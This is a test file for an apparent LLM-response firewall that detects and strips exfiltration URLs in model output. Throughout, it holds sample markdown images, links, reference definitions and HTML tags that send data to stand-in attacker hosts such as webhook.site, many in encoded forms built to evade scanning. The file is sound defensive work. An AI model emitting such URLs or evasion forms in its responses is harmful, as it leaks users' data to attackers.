import { describe, it, expect } from 'vitest'
import { scanResponseExfil, neutralizeExfil, scanJsonTextFields, neutralizeJsonExfil } from '../../src/detection/responseExfil.js'

// Test predicate: treat the attacker host as an exfil sink, everything else clean.
const isExfil = (h: string) => h === 'evil.example.com' || h === 'webhook.site'

describe('scanResponseExfil', () => {
  it('flags a markdown-image URL pointing at an exfil sink', () => {
    const text = 'Here is the chart ![chart](https://evil.example.com/c?d=secret)'
    const f = scanResponseExfil(text, isExfil)
    expect(f).toHaveLength(1)
    expect(f[0]!.kind).toBe('markdown-image')
    expect(f[0]!.url).toBe('https://evil.example.com/c?d=secret')
  })

  it('flags an HTML <img src> exfil URL', () => {
    const f = scanResponseExfil('<img src="https://webhook.site/abc?x=1">', isExfil)
    expect(f).toHaveLength(1)
    expect(f[0]!.kind).toBe('html-image')
  })

  it('flags a markdown link to an exfil sink', () => {
    const f = scanResponseExfil('see [here](https://evil.example.com/leak)', isExfil)
    expect(f).toHaveLength(1)
    expect(f[0]!.kind).toBe('markdown-link')
  })

  it('does NOT flag images/links to non-exfil (allowlisted) hosts', () => {
    const text = 'logo ![logo](https://cdn.trusted.com/logo.png) and [docs](https://trusted.com/help)'
    expect(scanResponseExfil(text, isExfil)).toHaveLength(0)
  })

  it('returns nothing for plain text', () => {
    expect(scanResponseExfil('The revenue rose 12% this quarter.', isExfil)).toHaveLength(0)
  })

  it('silently skips a regex-matched URL that fails URL parsing (parseUrl catch branch)', () => {
    // Trailing bare % is valid regex match but throws in new URL() — tests the catch path.
    expect(scanResponseExfil('![x](https://broken%)', isExfil)).toHaveLength(0)
  })

  it('dedupes repeated URLs of the same kind', () => {
    const text = '![a](https://evil.example.com/x) and again ![b](https://evil.example.com/x)'
    expect(scanResponseExfil(text, isExfil)).toHaveLength(1)
  })

  // #574: a reference-style image fetches the URL of its definition line, and
  // the inline patterns never saw it.
  describe('link reference definitions', () => {
    const DOC = '![chart][r]\n\n[r]: https://webhook.site/?d=secret'

    it('flags the URL of a definition, as an image', () => {
      const f = scanResponseExfil(DOC, isExfil)
      expect(f.map(x => [x.kind, x.url])).toEqual([['markdown-image', 'https://webhook.site/?d=secret']])
    })

    it('flags it inside a JSON response body, where line breaks are escaped', () => {
      const body = JSON.stringify({ content: [{ type: 'text', text: DOC }] })
      expect(scanResponseExfil(body, isExfil).map(x => x.url)).toEqual(['https://webhook.site/?d=secret'])
      const lead = JSON.stringify({ content: [{ type: 'text', text: '[r]: <https://webhook.site/?d=1>' }] })
      expect(scanResponseExfil(lead, isExfil).map(x => x.url)).toEqual(['https://webhook.site/?d=1'])
    })

    it('does not flag a definition to a clean host', () => {
      expect(scanResponseExfil('[docs]: https://trusted.com/help', isExfil)).toEqual([])
    })

    // A definition can sit in a blockquote or a list item, carry escapes in
    // its label, or use an upper-case scheme; renderers accept all of them.
    // Any `]:` before an exfil URL is flagged, whatever starts the line.
    it('flags a definition whatever its line prefix, label or scheme case', () => {
      for (const text of [
        '> [r]: https://webhook.site/?d=1',
        '- [r]: https://webhook.site/?d=1',
        '1. [r]: https://webhook.site/?d=1',
        '[a\\]b]: https://webhook.site/?d=1',
        '[r]: HTTPS://webhook.site/?d=1',
        'see the note [r]: https://webhook.site/?d=1',
        '[r]:\n  https://webhook.site/?d=1',
        JSON.stringify({ text: '[r]:\nhttps://webhook.site/?d=1' }),
        JSON.stringify({ text: '[r]:\r\nhttps://webhook.site/?d=1' }),
      ]) expect(scanResponseExfil(text, isExfil), text).toHaveLength(1)
    })

    it('is neutralized like an inline URL', () => {
      expect(neutralizeExfil(DOC, scanResponseExfil(DOC, isExfil))).not.toContain('webhook.site')
    })

    it('stays linear on 200 KB of near-definitions', () => {
      for (const filler of ['"[', '\n[', '\\n[ ', ' '.repeat(2), '1-', 'aZ09_-']) {
        const text = filler.repeat(Math.ceil(200_000 / filler.length))
        const started = Date.now()
        scanResponseExfil(text, isExfil)
        expect(Date.now() - started).toBeLessThan(500)
      }
    })
  })

  // A scheme-relative URL resolves to https in a browser, so `//host/...`
  // is a destination like any other, inline or in a definition.
  describe('scheme-relative URLs', () => {
    it('flags them in every markup form', () => {
      for (const text of [
        '![x](//webhook.site/?d=1)',
        '[x](//webhook.site/?d=1)',
        '<img src="//webhook.site/?d=1">',
        '[r]: //webhook.site/?d=1',
      ]) {
        const f = scanResponseExfil(text, isExfil)
        expect(f, text).toHaveLength(1)
        expect(f[0]!.url).toBe('//webhook.site/?d=1')
      }
    })

    it('does not flag a scheme-relative URL to a clean host', () => {
      expect(scanResponseExfil('![x](//cdn.trusted.com/a.png)', isExfil)).toEqual([])
    })
  })

  it('handles empty input', () => {
    expect(scanResponseExfil('', isExfil)).toHaveLength(0)
  })

  // GHSA-ggrw-cm2f-mh3c: the markdown patterns restarted at every bracket and
  // ran to the end of the text when the markup never closed. Each size must
  // cost about twice the one before: an absolute limit passes at a size too
  // small to show the square, and fails on a loaded machine.
  describe('markdown stays linear', () => {
    const fillers = ['![', '[', '[a](//x', '![a](//x', '](//x', '](', '![a](', '](<', '](//x ', '[a](//x "', '![]', '[]('] as const
    const timed = (text: string) => {
      const started = performance.now()
      scanResponseExfil(text, isExfil)
      return performance.now() - started
    }
    for (const wrap of ['raw', 'json'] as const) {
      for (const filler of fillers) {
        it(`${wrap}: ${filler}`, () => {
          const at = (kb: number) => {
            const text = filler.repeat(Math.ceil((kb * 1024) / filler.length))
            return wrap === 'raw' ? text : JSON.stringify({ text })
          }
          const best = (text: string) => Math.min(timed(text), timed(text), timed(text))
          const small = best(at(100))
          const large = best(at(400))
          // Twice the room a linear scan needs, and a floor for timer noise.
          expect(large, `${filler}: ${small} ms at 100 KB, ${large} ms at 400 KB`).toBeLessThan(small * 4 * 2 + 150)
          // These shapes hold 50,000 destinations to parse, so the ceiling has to
          // leave room for a loaded machine. The old code took 18 s at 200 KB.
          expect(large, filler).toBeLessThan(10_000)
        })
      }
    }
  })

  // The bracket text and the destination are read separately, so these must
  // still be found the way the patterns found them.
  describe('markdown destinations', () => {
    it('labels each form by what a client does with it', () => {
      const kinds = (t: string) => scanResponseExfil(t, isExfil).map(f => f.kind)
      expect(kinds('![a](https://webhook.site/?d=1)')).toEqual(['markdown-image'])
      expect(kinds('[a](https://webhook.site/?d=1)')).toEqual(['markdown-link'])
      expect(kinds('[![a](https://webhook.site/?d=1)](https://evil.example.com/x)')).toEqual(['markdown-image', 'markdown-link'])
      expect(kinds('![a [nested] b](https://webhook.site/?d=1)')).toEqual(['markdown-image'])
    })

    it('reads titles, angle brackets and spaces around the destination', () => {
      for (const t of [
        '![a]( https://webhook.site/?d=1 )',
        '![a](<https://webhook.site/?d=1>)',
        '![a](https://webhook.site/?d=1 "title")',
        '![a](<https://webhook.site/?d=1> "title")',
      ]) expect(scanResponseExfil(t, isExfil).map(f => f.url), t).toEqual(['https://webhook.site/?d=1'])
    })

    it('judges a destination nested inside one that never closes', () => {
      expect(scanResponseExfil('[a](https://ok.example.com/[b](https://webhook.site/?d=1', isExfil).map(f => f.url)).toContain('https://webhook.site/?d=1')
    })

    it('reports nothing for an allowed host, a relative link or prose brackets', () => {
      expect(scanResponseExfil('[a](https://ok.example.com/) ![b](./x.png) items[0](call) [c] (https://webhook.site)', isExfil)).toEqual([])
    })
  })

  // GHSA-983r-9gmc-f3xr: the <img> pattern's lazy attribute scan restarted at
  // every `<img` and ran to the end of the text when no URL followed, so 400 KB
  // of `<img src="` took 10.5 s on the request thread. Each tag is now read once.
  describe('<img> tags', () => {
    it('stays linear on 400 KB of unfinished tags, raw and in a JSON body', () => {
      for (const filler of ['<img src="', '<img ', '<img alt="', '<IMG SRC=', '<img src=x '])  {
        const text = filler.repeat(Math.ceil(400_000 / filler.length))
        const started = Date.now()
        scanResponseExfil(text, isExfil)
        scanResponseExfil(JSON.stringify({ content: [{ type: 'text', text }] }), isExfil)
        expect(Date.now() - started, filler).toBeLessThan(500)
      }
    })

    it('flags the src of a tag whatever its attributes', () => {
      for (const text of [
        '<img src="https://webhook.site/?d=1">',
        "<img alt='x' src='https://webhook.site/?d=1' />",
        '<IMG SRC=https://webhook.site/?d=1>',
        '<img alt=">" src="https://webhook.site/?d=1">',
        '<img\n  width="1"\n  src="https://webhook.site/?d=1">',
      ]) expect(scanResponseExfil(text, isExfil).map(f => f.kind), text).toEqual(['html-image'])
    })

    it('flags it inside a JSON response body, where the quotes are escaped', () => {
      const body = JSON.stringify({ content: [{ type: 'text', text: 'see <img src="https://webhook.site/?d=1">' }] })
      const f = scanResponseExfil(body, isExfil)
      expect(f.map(x => x.url)).toEqual(['https://webhook.site/?d=1'])
      expect(neutralizeExfil(body, f)).not.toContain('webhook.site')
    })

    it('reads each tag on its own', () => {
      expect(scanResponseExfil('<img src="https://cdn.trusted.com/a.png"> text <img src="https://webhook.site/?d=1">', isExfil).map(f => f.url))
        .toEqual(['https://webhook.site/?d=1'])
      expect(scanResponseExfil('<img alt="no src here"> then src="https://webhook.site/?d=1"', isExfil)).toEqual([])
    })
  })
})

// GHSA-less gap, #580: the scanner read a destination only when its raw text
// began `http(s)://` or `//`. A browser normalises the text first (entities,
// backslashes for slashes, tabs and newlines stripped, CommonMark escapes), so
// each form below reached the same host unseen. Each is judged as the client
// will resolve it, and the finding keeps the raw text the body really holds.
describe('encoded destinations (#580)', () => {
  const found = (t: string) => scanResponseExfil(t, isExfil).map(f => f.kind)

  it('reads HTML entities in a markdown destination', () => {
    expect(found('![x](https&#58;&#47;&#47;webhook.site/?d=1)')).toEqual(['markdown-image'])
    expect(found('![x](https&#x3A;&#x2F;&#x2F;webhook.site/?d=1)')).toEqual(['markdown-image'])
    expect(found('[x](https:&#47;&#47;webhook.site/?d=1)')).toEqual(['markdown-link'])
  })

  it('reads HTML entities in an img src', () => {
    expect(found('<img src="&#x2F;&#x2F;webhook.site/?d=1">')).toEqual(['html-image'])
  })

  it('reads a backslash for a slash, the way the URL parser does for http(s)', () => {
    expect(found('![x](https:\\webhook.site/?d=1)')).toEqual(['markdown-image'])
    expect(found('![x](https:\\\\webhook.site/?d=1)')).toEqual(['markdown-image'])
    // CommonMark reads `\\` as one escaped backslash before the URL parser sees
    // it, so the destination is `\webhook.site`: a same-site path, not a host.
    expect(found('![x](\\\\webhook.site/?d=1)')).toEqual([])
    expect(found('<img src="https:\\webhook.site/?d=1">')).toEqual(['html-image'])
  })

  it('reads a CommonMark backslash escape in a destination', () => {
    expect(found('![x](https:\\/\\/webhook.site/?d=1)')).toEqual(['markdown-image'])
  })

  it('strips a tab or newline from an img src, as the URL parser does', () => {
    expect(found('<img src="ht\ttps://webhook.site/?d=1">')).toEqual(['html-image'])
    expect(found('<img src="https://web\nhook.site/?d=1">')).toEqual(['html-image'])
  })

  it('reads an entity-encoded reference definition', () => {
    expect(found('[r]: https&#58;//webhook.site/?d=1')).toEqual(['markdown-image'])
  })

  it('reads the same forms inside a JSON response body, where backslashes are doubled', () => {
    const body = JSON.stringify({ content: [{ type: 'text', text: '![x](https:\\webhook.site/?d=1) and <img src="https:\\\\webhook.site/?d=2">' }] })
    const f = scanResponseExfil(body, isExfil)
    expect(f.map(x => x.kind)).toEqual(['markdown-image', 'html-image'])
    expect(neutralizeExfil(body, f)).not.toContain('webhook.site')
  })

  it('reads a \\u escape in a JSON body, as a serializer writes a colon or slash', () => {
    const body = '{"content":[{"type":"text","text":"![x](https\\u003a\\u002f\\u002fwebhook.site/?d=1)"}]}'
    const f = scanResponseExfil(body, isExfil)
    expect(f.map(x => x.kind)).toEqual(['markdown-image'])
    expect(neutralizeExfil(body, f)).not.toContain('webhook.site')
  })

  // #674: poster, srcset and href are fetched (or followed) the same way src is.
  describe('poster, srcset and href (#674)', () => {
    it('flags a poster, which a video fetches without a click', () => {
      expect(scanResponseExfil('<video poster="https://webhook.site/?d=1"></video>', isExfil).map(f => f.kind)).toEqual(['html-image'])
    })

    it('flags each srcset candidate, not only the first', () => {
      const f = scanResponseExfil('<img srcset="https://cdn.trusted.com/a.png 1x, https://webhook.site/?d=1 2x">', isExfil)
      expect(f.map(x => x.url)).toEqual(['https://webhook.site/?d=1'])
      expect(f.map(x => x.kind)).toEqual(['html-image'])
    })

    it('flags an href as the one-click link it is', () => {
      expect(scanResponseExfil('<a href="https://webhook.site/leak">here</a>', isExfil).map(f => f.kind)).toEqual(['markdown-link'])
    })

    it('reads these attributes inside a JSON body and in encoded form', () => {
      const body = JSON.stringify({ text: '<video poster="https:\\\\webhook.site/?d=1"></video> <a href="&#x68;ttps://webhook.site/x">a</a>' })
      const f = scanResponseExfil(body, isExfil)
      expect(f.map(x => x.kind)).toEqual(['html-image', 'markdown-link'])
      expect(neutralizeExfil(body, f)).not.toContain('webhook.site')
    })

    it('does not flag these attributes pointing at an allowed host', () => {
      expect(scanResponseExfil('<video poster="https://cdn.trusted.com/p.png"></video> <a href="https://docs.trusted.com/">x</a> <img srcset="https://cdn.trusted.com/a.png 2x">', isExfil)).toEqual([])
    })

    it('stays linear on 200 KB of unfinished poster, href and srcset attributes', () => {
      for (const filler of ['<video poster="', '<a href="', '<img srcset="https://a.example/x 1x, ', '<audio src=x ']) {
        const text = filler.repeat(Math.ceil(200_000 / filler.length))
        const started = Date.now()
        scanResponseExfil(text, isExfil)
        scanResponseExfil(JSON.stringify({ text }), isExfil)
        expect(Date.now() - started, filler).toBeLessThan(500)
      }
    })
  })

  it('does not flag an encoded relative or allowed destination', () => {
    expect(scanResponseExfil('![x](&#x2F;docs&#x2F;a.png) <img src="&#x2F;img&#x2F;logo.png"> [r]: docs/x', isExfil)).toEqual([])
    expect(scanResponseExfil('![x](https&#58;&#47;&#47;cdn.trusted.com/a.png)', isExfil)).toEqual([])
  })

  it('stays linear on 200 KB of encoded destinations', () => {
    for (const filler of ['https&#58;', '\\\\', 'ht\t', '&#x2F;', '\\/']) {
      const inline = '![x](' + filler.repeat(Math.ceil(200_000 / filler.length))
      const tag = '<img src="' + filler.repeat(Math.ceil(200_000 / filler.length))
      const started = Date.now()
      scanResponseExfil(inline, isExfil)
      scanResponseExfil(tag, isExfil)
      scanResponseExfil(JSON.stringify({ text: inline + tag }), isExfil)
      // Three scans, 800 KB in all: 72 ms for the slowest filler on a
      // developer machine, 674 ms on CI under coverage, which failed a 500 ms
      // budget. A quadratic scan of this much takes tens of seconds.
      expect(Date.now() - started, filler).toBeLessThan(2000)
    }
  })
})

describe('neutralizeExfil', () => {
  it('replaces the offending URL with an inert placeholder, keeping surrounding text', () => {
    const text = 'chart ![c](https://evil.example.com/c?d=secret) done'
    const findings = scanResponseExfil(text, isExfil)
    const out = neutralizeExfil(text, findings)
    expect(out).not.toContain('evil.example.com')
    expect(out).toContain('llm-fw-blocked-exfil-url')
    expect(out).toContain('chart')
    expect(out).toContain('done')
  })

  it('leaves text without findings unchanged', () => {
    const text = 'nothing to see ![ok](https://trusted.com/x.png)'
    expect(neutralizeExfil(text, [])).toBe(text)
  })
})

// #580 step 4: Go's encoding/json writes <, > and & as \u003c, \u003e and
// \u0026, so the raw body holds no tag; the client renders the decoded text.
const goJson = (value: unknown) => JSON.stringify(value).replace(/</g, '\\u003c').replace(/>/g, '\\u003e').replace(/&/g, '\\u0026')

describe('scanJsonTextFields', () => {
  const img = '<img src="https://webhook.site/c?d=secret&v=2">'

  it('finds the tag in the decoded text, by the URL the client fetches', () => {
    const body = goJson({ content: [{ type: 'text', text: `chart ${img}` }] })
    const f = scanJsonTextFields(body, isExfil, [])
    expect(f.map(x => [x.kind, x.url])).toEqual([['html-image', 'https://webhook.site/c?d=secret&v=2']])
  })

  it('reads every provider shape: OpenAI message content, Responses output, Gemini parts', () => {
    for (const body of [
      goJson({ choices: [{ message: { role: 'assistant', content: img } }] }),
      goJson({ output: [{ type: 'message', content: [{ type: 'output_text', text: img }] }] }),
      goJson({ candidates: [{ content: { parts: [{ text: img }] } }] }),
    ]) expect(scanJsonTextFields(body, isExfil, []), body).toHaveLength(1)
  })

  it('does not repeat what the raw scan found, escaped slashes included', () => {
    const body = JSON.stringify({ text: 'see ![c](https://evil.example.com/c?d=1)' }).replace(/\//g, '\\/')
    const raw = scanResponseExfil(body, isExfil)
    expect(raw).toHaveLength(1)
    expect(raw[0]!.url).toContain('\\/')
    expect(scanJsonTextFields(body, isExfil, raw)).toEqual([])
  })

  it('reads only rendered text, not tool input, ids or metadata', () => {
    const body = goJson({ id: img, content: [{ type: 'tool_use', name: 'fetch', input: { url: img, html: img } }] })
    expect(scanJsonTextFields(body, isExfil, [])).toEqual([])
  })

  it('returns nothing for a body that is not JSON, and survives deep nesting', () => {
    expect(scanJsonTextFields(`not json ${img}`, isExfil, [])).toEqual([])
    const deep = '['.repeat(100_000) + ']'.repeat(100_000)
    expect(() => scanJsonTextFields(deep, isExfil, [])).not.toThrow()
  })

  it('stays linear on 200 KB of escaped tags in one field and across many', () => {
    for (const filler of ['<img src="', ' ', '1-', 'aGVsbG8_d29ybGQ']) {
      const one = goJson({ text: filler.repeat(Math.ceil(200_000 / filler.length)) })
      const many = goJson({ content: Array.from({ length: 20_000 }, () => ({ text: `${filler}x` })) })
      const started = Date.now()
      scanJsonTextFields(one, isExfil, [])
      scanJsonTextFields(many, isExfil, [])
      expect(Date.now() - started, filler).toBeLessThan(2000)
    }
  })
})

describe('neutralizeJsonExfil', () => {
  const img = '<img src="https://webhook.site/c?d=1&v=2">'

  // On main the raw scan found no tag in these bodies, so block mode
  // forwarded the destination without an event.
  it('takes out a destination the raw scan does not see, in every body shape', () => {
    for (const body of [
      goJson({ text: `chart ${img}` }),
      goJson({ id: 'm', content: [{ type: 'text', text: `chart ${img}` }] }),
      goJson({ id: 'm', content: [{ type: 'text', text: `a ${img} b` }, { type: 'text', text: 'untouched <b>' }] }),
      goJson({ choices: [{ message: { content: img.replace('&v=2', '') } }] }),
    ]) {
      const raw = scanResponseExfil(body, isExfil)
      expect(neutralizeExfil(body, raw), body).toContain('webhook.site')
      const out = neutralizeJsonExfil(body, isExfil, raw)
      expect(out, body).not.toBeNull()
      expect(out, body).not.toContain('webhook.site')
    }
  })

  it('rewrites only the field that held it', () => {
    const body = goJson({ id: 'msg_1', content: [{ type: 'text', text: `a ${img} b` }, { type: 'text', text: 'untouched <b>' }] })
    const out = neutralizeJsonExfil(body, isExfil, scanResponseExfil(body, isExfil))
    expect(JSON.parse(out!)).toEqual({ id: 'msg_1', content: [{ type: 'text', text: 'a <img src="llm-fw-blocked-exfil-url"> b' }, { type: 'text', text: 'untouched <b>' }] })
  })

  it('keeps the exact bytes when the raw replacement already took everything out', () => {
    const plain = goJson({ content: [{ type: 'text', text: 'see ![c](https://evil.example.com/c?d=1) and <b>' }] })
    const out = neutralizeJsonExfil(plain, isExfil, scanResponseExfil(plain, isExfil))
    expect(out).toBe(plain.replace('https://evil.example.com/c?d=1', 'llm-fw-blocked-exfil-url'))
    expect(out).toContain('\\u003cb\\u003e')
  })

  it('leaves a body that is not JSON to the raw replacement', () => {
    const text = 'see ![c](https://evil.example.com/c?d=1)'
    expect(neutralizeJsonExfil(text, isExfil, scanResponseExfil(text, isExfil))).toBe('see ![c](llm-fw-blocked-exfil-url)')
  })
})
